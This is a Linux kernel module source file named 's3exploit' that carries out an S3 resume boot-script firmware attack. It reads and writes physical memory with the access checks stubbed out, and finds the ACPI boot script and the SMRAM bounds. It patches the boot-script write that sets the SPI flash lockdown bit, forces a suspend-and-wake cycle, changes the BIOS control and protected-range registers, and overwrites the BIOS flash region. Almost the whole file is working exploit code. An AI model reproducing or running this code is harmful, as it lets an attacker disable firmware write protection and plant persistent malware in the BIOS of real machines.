#include "linux/alarmtimer.h"
#include "linux/device/class.h"
#include "linux/gfp.h"
#include "linux/device.h"
#include "linux/err.h"
#include "linux/slab.h"
#include "linux/rtc.h"
#include "linux/efi.h"
#include "linux/io.h"
#include "asm/io.h"
#include "linux/suspend.h"
#include "linux/acpi.h"

#include "s3bootscript.h"
#include "s3exploit_ioctl.h"
#include "s3exploit.h"

struct s3exploit {
    struct rtc_device *rtc_wakeup_clock;
    phys_addr_t bootscript_phys_addr;

    uint8_t* bootscript;
    size_t bootscript_size;

    phys_addr_t pci_mmio_addr;
    phys_addr_t rcba_addr;
    phys_addr_t spibar_addr;

    phys_addr_t smram_base;
    phys_addr_t smram_limit;

    phys_addr_t bios_region_addr;
};

const efi_char16_t  AcpiGlobalVar_Name[] = L"AcpiGlobalVariable";
const efi_guid_t    AcpiGlobalVar_Guid   = 
    EFI_GUID(0xaf9ffd67, 0xec10, 0x488a, 0x9d, 0xfc, 0x6c, 0xbf, 0x5e, 0xe2, 0x2c, 0x2e);

static int has_wakeup(struct rtc_device *dev) {
    if (!dev->ops->set_alarm)
        return 0;

    if (!device_can_wakeup(dev->dev.parent))
        return 0;

    return 1;
}

static struct rtc_device *find_rtc_alarm_clock(void) {
    struct rtc_device *rtc_clock = alarmtimer_get_rtcdev();
    
    if (!has_wakeup(rtc_clock))
        return ERR_PTR(-ENOENT);

    return rtc_clock;
}

// BEGIN copied from /drivers/char/mem.c
static void *custom_xlate_dev_mem_ptr(phys_addr_t phys) {
	unsigned long start  = phys &  PAGE_MASK;
	unsigned long offset = phys & ~PAGE_MASK;
	void *vaddr;

	/* memremap() maps if RAM, otherwise falls back to ioremap() */
	vaddr = memremap(start, PAGE_SIZE, MEMREMAP_WB);

	/* Only add the offset on success and return NULL if memremap() failed */
	if (vaddr)
		vaddr += offset;

	return vaddr;
}

static void custom_unxlate_dev_mem_ptr(phys_addr_t UNSUSED, void *virt_addr) {
	memunmap((void *)((unsigned long)virt_addr & PAGE_MASK));
}

static inline unsigned long size_inside_page(unsigned long start,
					     unsigned long size)
{
	unsigned long sz;

	sz = PAGE_SIZE - (start & (PAGE_SIZE - 1));

	return min(sz, size);
}

static inline int page_is_allowed(unsigned long pfn)
{
	return 1;
}
static inline int range_is_allowed(unsigned long pfn, unsigned long size)
{
	return 1;
}

static ssize_t read_mem(char *buf, size_t count, loff_t *ppos)
{
	phys_addr_t p = *ppos;
	ssize_t read, sz;
	void *ptr;
	char *bounce;
	int err;

	/* if (p != *ppos) */
	/* 	return 0; */

	/* if (!valid_phys_addr_range(p, count)) */
	/* 	return -EFAULT; */
	read = 0;
#ifdef __ARCH_HAS_NO_PAGE_ZERO_MAPPED
	/* we don't have page 0 mapped on sparc and m68k.. */
	if (p < PAGE_SIZE) {
		sz = size_inside_page(p, count);
		if (sz > 0) {
			if (clear_user(buf, sz))
				return -EFAULT;
			buf += sz;
			p += sz;
			count -= sz;
			read += sz;
		}
	}
#endif

	bounce = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (!bounce)
		return -ENOMEM;

	while (count > 0) {
		unsigned long remaining;
		int allowed, probe;

		sz = size_inside_page(p, count);

		err = -EPERM;
		allowed = page_is_allowed(p >> PAGE_SHIFT);
		if (!allowed)
			goto failed;

		err = -EFAULT;
		if (allowed == 2) {
			/* Show zeros for restricted memory. */
			remaining = clear_user(buf, sz);
		} else {
			/*
			 * On ia64 if a page has been mapped somewhere as
			 * uncached, then it must also be accessed uncached
			 * by the kernel or data corruption may occur.
			 */
			ptr = custom_xlate_dev_mem_ptr(p);
			if (!ptr)
				goto failed;

			probe = copy_from_kernel_nofault(bounce, ptr, sz);
			custom_unxlate_dev_mem_ptr(p, ptr);
			if (probe)
				goto failed;

			memcpy(buf, bounce, sz);
            remaining = 0;
		}

		if (remaining)
			goto failed;

		buf += sz;
		p += sz;
		count -= sz;
		read += sz;
		/* if (should_stop_iteration()) */
		/* 	break; */
	}
	kfree(bounce);

	*ppos += read;
	return read;

failed:
	kfree(bounce);
	return err;
}
static ssize_t write_mem(const char *buf, size_t count, loff_t *ppos)
{
	phys_addr_t p = *ppos;
	ssize_t written, sz;
	unsigned long copied;
	void *ptr;

	if (p != *ppos)
		return -EFBIG;

	/* if (!valid_phys_addr_range(p, count)) */
	/* 	return -EFAULT; */

	written = 0;

#ifdef __ARCH_HAS_NO_PAGE_ZERO_MAPPED
	/* we don't have page 0 mapped on sparc and m68k.. */
	if (p < PAGE_SIZE) {
		sz = size_inside_page(p, count);
		/* Hmm. Do something? */
		buf += sz;
		p += sz;
		count -= sz;
		written += sz;
	}
#endif

	while (count > 0) {
		int allowed;

		sz = size_inside_page(p, count);

		allowed = page_is_allowed(p >> PAGE_SHIFT);
		if (!allowed)
			return -EPERM;

		/* Skip actual writing when a page is marked as restricted. */
		if (allowed == 1) {
			/*
			 * On ia64 if a page has been mapped somewhere as
			 * uncached, then it must also be accessed uncached
			 * by the kernel or data corruption may occur.
			 */
			ptr = custom_xlate_dev_mem_ptr(p);
			if (!ptr) {
				if (written)
					break;
				return -EFAULT;
			}

			copied = memcpy(ptr, buf, sz) - ptr;
			custom_unxlate_dev_mem_ptr(p, ptr);
			if (copied) {
				written += sz - copied;
				if (written)
					break;
				return -EFAULT;
			}
		}

		buf += sz;
		p += sz;
		count -= sz;
		written += sz;
		/* if (should_stop_iteration()) */
		/* 	break; */
	}

	*ppos += written;
	return written;
}
//END copied from /drivers/char/mem.c

static const phys_addr_t find_AcpiGlobalVariable_addr(void) {
    int status;
    u32 attributes = 0;
    phys_addr_t AcpiGlobalVar_ptr;
    unsigned long size = sizeof(AcpiGlobalVar_ptr);
    struct efivar_entry *entry;

    entry = kmalloc(sizeof(* entry), GFP_KERNEL);
    if (!entry)
        return (phys_addr_t) ERR_PTR(-ENOMEM);

    memcpy(entry->var.VariableName, AcpiGlobalVar_Name, sizeof(AcpiGlobalVar_Name)); 
    memcpy(&entry->var.VendorGuid, &AcpiGlobalVar_Guid, sizeof(AcpiGlobalVar_Guid));
    status = efivar_entry_get(entry, &attributes, &size, &AcpiGlobalVar_ptr);

    kfree(entry);
    if (status < 0)
        return (phys_addr_t) ERR_PTR(status);

    return AcpiGlobalVar_ptr;
}

static phys_addr_t get_s3bootscript_addr(const phys_addr_t AcpiGlobalVar_addr) {
    phys_addr_t bootscript_addr;
    struct AcpiVariableSet *virt_ptr = custom_xlate_dev_mem_ptr(AcpiGlobalVar_addr);

    if (IS_ERR(virt_ptr))
        return (phys_addr_t) virt_ptr;

    bootscript_addr = (phys_addr_t) virt_ptr->AcpiBootScriptTable;

    custom_unxlate_dev_mem_ptr(AcpiGlobalVar_addr, virt_ptr);
    return bootscript_addr;
}

static int bootscript_complete(uint8_t *buffer, size_t size) {
    struct Header *instruction = (struct Header *) buffer;
    uint8_t *ptr = buffer;
    uint8_t *end = buffer + size;

    while (ptr < end) {
        instruction = (struct Header *) ptr;
        if (instruction->Opcode == Opcode_End)
            return 1;

        ptr += instruction->Size;
    }

    return 0;
}

static void copy_phys_page(void *dst, phys_addr_t addr) {
    void *virt_addr = custom_xlate_dev_mem_ptr(addr);
    memcpy(dst, virt_addr, PAGE_SIZE);
    custom_unxlate_dev_mem_ptr(addr, virt_addr);
}

static uint8_t *read_bootscript(phys_addr_t bootscript_addr) {
    size_t size = 0;
    uint8_t *buffer = NULL;
    uint8_t *dst = NULL;
    phys_addr_t current_phys_offset = bootscript_addr;

    while (!bootscript_complete(buffer, size)) {
        buffer = krealloc(buffer, size + PAGE_SIZE, GFP_KERNEL);
        if (!buffer)
            return ERR_PTR(-ENOMEM);

        dst = &buffer[size];
        if (read_mem(dst, PAGE_SIZE, &current_phys_offset) != PAGE_SIZE) {
            kfree(buffer);
            return ERR_PTR(-EFAULT);
        }

        size += PAGE_SIZE;
    }

    return buffer;    
}

static int calc_size(struct Header *instruction, void *data) {
    size_t *size = (size_t *) data;
    *size += instruction->Size;
    return 1;
}

static void hexdump(void *addr, size_t size) {
    size_t i;
    uint8_t *ptr = (uint8_t *) addr;
    for (i=0; i < size; i += 8) {
        printk(KERN_INFO "s3exploit: %px: %X %X %X %X %X %X %X %X\n", ptr + i, 
                *(ptr + i + 0),
                *(ptr + i + 1),
                *(ptr + i + 2),
                *(ptr + i + 3),
                *(ptr + i + 4),
                *(ptr + i + 5),
                *(ptr + i + 6),
                *(ptr + i + 7)
                );
    }
}

static phys_addr_t fetch_pci_mmio_addr(void) {
    struct acpi_table_header *mcfg_table;
    acpi_status status = acpi_get_table("MCFG", 0, &mcfg_table);
    phys_addr_t pci_mmio_addr = 0;

    if (status != AE_OK)
        return (phys_addr_t) ERR_PTR(-ENOENT);

    memcpy(&pci_mmio_addr, ((uint8_t *) mcfg_table) + 0x2c, 4);
    acpi_put_table(mcfg_table);
    
    return pci_mmio_addr;
}

static phys_addr_t fetch_rcba_addr(phys_addr_t pci_mmio_addr) {
    const size_t LPC_DEVICE_BUS = 0;
    const size_t LPC_DEVICE_NUMBER = 31;
    const size_t LPC_DEVICE_FUNCTION = 0;

    phys_addr_t config_space_addr = 
        pci_mmio_addr + (LPC_DEVICE_BUS << 20) | (LPC_DEVICE_NUMBER << 15) | (LPC_DEVICE_FUNCTION << 12);
    phys_addr_t rcba_reg = config_space_addr + 0xf0;

    phys_addr_t rcba_addr = 0;
    size_t bytes_read = read_mem((char *) &rcba_addr, 4, (loff_t *) &rcba_reg);
    if (bytes_read != 4) 
        return (phys_addr_t) ERR_PTR(-EFAULT);

    return rcba_addr & 0xFFFFC000;
}

static uint32_t fetch_bios_cntl(phys_addr_t pci_mmio_addr) {
    const size_t LPC_DEVICE_BUS = 0;
    const size_t LPC_DEVICE_NUMBER = 31;
    const size_t LPC_DEVICE_FUNCTION = 0;

    phys_addr_t config_space_addr = 
        pci_mmio_addr + (LPC_DEVICE_BUS << 20) | (LPC_DEVICE_NUMBER << 15) | (LPC_DEVICE_FUNCTION << 12);
    phys_addr_t bios_cntl_reg = config_space_addr + 0xdc;

    uint8_t value = 0;
    size_t bytes_read = read_mem((char *) &value, 1, (loff_t *) &bios_cntl_reg);
    if (bytes_read != sizeof(value)) 
        return (uint32_t) -1;

    return value;
}

static int set_bios_cntl(phys_addr_t pci_mmio_addr, uint8_t value) {
    const size_t LPC_DEVICE_BUS = 0;
    const size_t LPC_DEVICE_NUMBER = 31;
    const size_t LPC_DEVICE_FUNCTION = 0;

    phys_addr_t config_space_addr = 
        pci_mmio_addr + (LPC_DEVICE_BUS << 20) | (LPC_DEVICE_NUMBER << 15) | (LPC_DEVICE_FUNCTION << 12);
    phys_addr_t bios_cntl_reg = config_space_addr + 0xdc;

    size_t bytes_written = write_mem((char *) &value, 1, (loff_t *) &bios_cntl_reg);
    if (bytes_written != sizeof(value)) 
        return (uint32_t) -1;

    return value;
}

static uint32_t fetch_smram_address(void) {
    const uint32_t MSR = 0x1f2UL;
    return __rdmsr(MSR) & 0xfffff000;
}

static uint32_t fetch_smram_limit(void) {
    const uint32_t MSR = 0x1f3UL;
    return __rdmsr(MSR) & 0xfffff000;
}

static size_t fetch_bios_region_size(struct spi_flash_info* info) {
    const uint32_t BIOS_REGION = 1;    
    const uint32_t freg = info->freg[BIOS_REGION];
    const uint32_t bios_region_base = freg & 0xfff; 
    const uint32_t bios_region_limit = (freg & (0xfff << 16)) >> 16; 
    return ((bios_region_limit + 1) - bios_region_base) << 12; 
}

struct s3exploit *s3exploit_init(void) {
    int status;
    void *error_ptr;
    size_t bios_region_size;
    phys_addr_t AcpiGlobalVar_ptr;
    struct s3exploit *ptr;
    struct spi_flash_info info;

    ptr = kmalloc(sizeof(* ptr), GFP_KERNEL); 
    if (!ptr)
        return ERR_PTR(-ENOMEM);
    
    ptr->rtc_wakeup_clock = find_rtc_alarm_clock();
    if (IS_ERR(ptr->rtc_wakeup_clock)) {
        error_ptr = ptr->rtc_wakeup_clock;
        goto error_free_s3exploit;
    }
    printk(KERN_INFO "s3exploit: Found rtc_device with wakeup\n");

    AcpiGlobalVar_ptr = find_AcpiGlobalVariable_addr();
    if (IS_ERR( (void *) AcpiGlobalVar_ptr)) {
        error_ptr = (void *) AcpiGlobalVar_ptr;
        goto error_free_s3exploit;
    }
    printk(KERN_INFO "s3exploit: Found AcpiVariableSet at %px\n", (void *) AcpiGlobalVar_ptr);

    ptr->bootscript_phys_addr = get_s3bootscript_addr(AcpiGlobalVar_ptr);
    printk(KERN_INFO "s3exploit: Bootscript located at %px\n", (void *) ptr->bootscript_phys_addr);

    ptr->bootscript = read_bootscript(ptr->bootscript_phys_addr);
    if (IS_ERR(ptr->bootscript)) {
        error_ptr = ptr->bootscript;
        goto error_free_s3exploit;
    }

    ptr->bootscript_size = 0;
    s3exploit_for_each_instruction(ptr, &calc_size, &ptr->bootscript_size);
    printk(KERN_INFO "s3exploit: Bootscript total size %ld\n", ptr->bootscript_size);

    ptr->pci_mmio_addr = fetch_pci_mmio_addr();
    if (IS_ERR( (void *) ptr->pci_mmio_addr)) {
        error_ptr = (void *) ptr->pci_mmio_addr;
        goto error_free_s3exploit;
    }
    printk(KERN_INFO "s3exploit: PCI MMIO Start address %px\n", (void *) ptr->pci_mmio_addr);

    ptr->rcba_addr = fetch_rcba_addr(ptr->pci_mmio_addr);
    if (IS_ERR( (void *) ptr->rcba_addr)) {
        error_ptr = (void *) ptr->rcba_addr;
        goto error_free_s3exploit;
    }
    printk(KERN_INFO "s3exploit: RCBA address %px\n", (void *) ptr->rcba_addr);

    ptr->spibar_addr = ptr->rcba_addr + 0x3800;
    printk(KERN_INFO "s3exploit: SPIBAR address %px\n", (void *) ptr->spibar_addr);

    ptr->smram_base = fetch_smram_address();
    ptr->smram_limit = fetch_smram_limit();
    printk(KERN_INFO "s3exploit: SMRAM Base: %px SMRAM Limit %px\n", 
            (void *) ptr->smram_base, (void *) ptr->smram_limit);

    info.what = SPI_FLASH_INFO_FREG;
    status = s3exploit_get_flash_info(ptr, &info);
    if (status < 0) {
        error_ptr = ERR_PTR(status);
        goto error_free_s3exploit;
    }
    bios_region_size = fetch_bios_region_size(&info);
    printk(KERN_INFO "s3exploit: BIOS region size %lx\n", bios_region_size);
    ptr->bios_region_addr = 0x100000000UL - bios_region_size;
    printk(KERN_INFO "s3exploit: BIOS region base %px\n", (void *) ptr->bios_region_addr);

    return ptr;

error_free_s3exploit:
    kfree(ptr);

    return error_ptr;
}

void s3exploit_deinit(struct s3exploit *ptr) {
    kfree(ptr);
}

phys_addr_t s3exploit_get_bootscript_addr(struct s3exploit *ptr) {
    return ptr->bootscript_phys_addr;    
}

size_t s3exploit_get_bootscript_size(struct s3exploit *ptr) {
    return ptr->bootscript_size;
}

uint8_t *s3exploit_get_bootscript_copy(struct s3exploit* ptr) {
    return ptr->bootscript;
}

void s3exploit_for_each_instruction(struct s3exploit *exploit, callback_t callback, void *data) {
    struct Header *instruction = (struct Header *) exploit->bootscript;

    while (callback(instruction, data) && instruction->Opcode != Opcode_End)
        instruction = (struct Header *) ((uint8_t *) instruction + instruction->Size);
}

int s3exploit_trigger_vuln(struct s3exploit *ptr, size_t wakeup_after) {
    time64_t now = 0;
    struct rtc_wkalrm alm;
    int status = 0;  

    status = rtc_read_time(ptr->rtc_wakeup_clock, &alm.time);
    if (status < 0)
        return status;

    now = rtc_tm_to_time64(&alm.time);
    memset(&alm, 0, sizeof(alm));
    rtc_time64_to_tm(now + wakeup_after, &alm.time);
    alm.enabled = true;

    status = rtc_set_alarm(ptr->rtc_wakeup_clock, &alm);
    if (status < 0)
        return status;
    
    status = pm_suspend(PM_SUSPEND_MEM);
    if (status < 0)
        return status;

    alm.enabled = false;
    return rtc_set_alarm(ptr->rtc_wakeup_clock, &alm);
}

int s3exploit_check_target(struct s3exploit *exploit) {
    const size_t BIOS_BWP = 1 << 5;
    const size_t BIOS_BLE = 1 << 1;
    const size_t BIOS_BWE = 1 << 0;
    uint32_t bios_cntl = fetch_bios_cntl(exploit->pci_mmio_addr);

    if (bios_cntl > 0xff)
        return 0;

    if (exploit->bootscript_phys_addr >= exploit->smram_base && 
        exploit->bootscript_phys_addr <= exploit->smram_limit)
        return 0;

    if (bios_cntl & BIOS_BLE) {
        if (bios_cntl & BIOS_BWP || bios_cntl & BIOS_BWE)
            return 0;
    } 

    return 1;
}

const size_t SPI_HSFS = 0x04;
const size_t SPI_FREG0 = 0x54;
const size_t SPI_PR0 = 0x74;

int s3exploit_get_flash_info(struct s3exploit *exploit, struct spi_flash_info *info) {
    void *virt_addr = custom_xlate_dev_mem_ptr(exploit->spibar_addr);

    if (info->what & SPI_FLASH_INFO_BIOS_CNTL) {
        info->bios_cntl = fetch_bios_cntl(exploit->pci_mmio_addr);
        if (info->bios_cntl > 0xff)
            return -EFAULT;
    }

    printk(KERN_INFO "s3exploit: dumping SPIBAR\n");
    hexdump (virt_addr, 0x100);

    if (info->what & SPI_FLASH_INFO_HSFS)
        memcpy(&info->hsfs, virt_addr + SPI_HSFS, sizeof(info->hsfs));

    if (info->what & SPI_FLASH_INFO_FREG)
        memcpy(&info->freg[0], virt_addr + SPI_FREG0, sizeof(info->freg));

    if (info->what & SPI_FLASH_INFO_PR)
        memcpy(&info->pr[0], virt_addr + SPI_PR0, sizeof(info->pr));

    custom_unxlate_dev_mem_ptr(exploit->spibar_addr, virt_addr);

    return 0; 
}

int s3exploit_set_flash_info(struct s3exploit *exploit, struct spi_flash_info *info) {
    void *virt_addr;
    int status;

    if (info->what & SPI_FLASH_INFO_BIOS_CNTL) {
        status = set_bios_cntl(exploit->pci_mmio_addr, info->bios_cntl);
        if (status < 0) 
            return status;
    }
        
    virt_addr = custom_xlate_dev_mem_ptr(exploit->spibar_addr);

    if (info->what & SPI_FLASH_INFO_PR)
        memcpy(virt_addr + SPI_PR0, &info->pr[0], sizeof(info->pr));

    if (info->what & SPI_FLASH_INFO_HSFS)
        memcpy(virt_addr + SPI_HSFS, &info->hsfs, sizeof(info->hsfs));

    custom_unxlate_dev_mem_ptr(exploit->spibar_addr, virt_addr);
    return 0; 
}

int s3exploit_reset_flockdn_bit(struct s3exploit *exploit) {
    struct Header *instruction;
    struct WriteInstr *concrete_instruction;
    const uint32_t flockdn_address = exploit->spibar_addr + 0x04;
    uint16_t *value;
    loff_t address;

    FOR_ALL_INSTRUCTIONS(instruction, exploit->bootscript) {
        if (instruction->Opcode != Opcode_MemWrite)
            continue;
        
        concrete_instruction = (struct WriteInstr*) instruction;
        if (concrete_instruction->LowAddress != flockdn_address ||
            concrete_instruction->HighAddress != 0)
            continue;

        printk(KERN_INFO "s3exploit: Found instruction writing to FLOCKDN, resseting to 0x6009\n");
        value = (uint16_t *) &concrete_instruction->Buffer[0];
        *value = 0x6009;

        printk(KERN_INFO "s3exploit: Writing back bootscript\n");
        address = exploit->bootscript_phys_addr;
        if (write_mem(exploit->bootscript, exploit->bootscript_size, &address) != exploit->bootscript_size) {
            printk(KERN_INFO "s3exploit: Error writing back bootscript\n");
            return -EFAULT;
        }

        return 0;
    }

    printk(KERN_INFO "s3exploit: Instruction writing to FLOCKDN not found\n");
    return -ENOENT;
}

int s3exploit_overwrite_bios(struct s3exploit *exploit, void *data, uint32_t size, uint32_t offset) {
    loff_t address = exploit->bios_region_addr + offset;
    size_t bytes_read = write_mem(data, size, &address);
    return bytes_read == size ? 0 : -EFAULT;
}
